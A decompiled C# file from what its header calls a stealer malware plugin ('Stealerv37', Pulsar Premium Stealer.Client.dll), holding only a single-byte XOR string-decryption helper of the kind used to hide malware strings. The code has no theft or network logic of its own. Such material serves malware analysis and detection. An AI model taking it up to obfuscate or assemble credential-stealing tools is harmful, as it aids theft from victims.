// Decompiled with JetBrains decompiler
// Type: Intelix.Helper.Encrypted.Xor
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using System.Text;

#nullable disable
namespace Intelix.Helper.Encrypted;

public static class Xor
{
  public static string DecryptString(string input, byte key)
  {
    byte[] bytes = Encoding.UTF8.GetBytes(input);
    for (int index = 0; index < bytes.Length; ++index)
      bytes[index] ^= key;
    return Encoding.UTF8.GetString(bytes);
  }
}
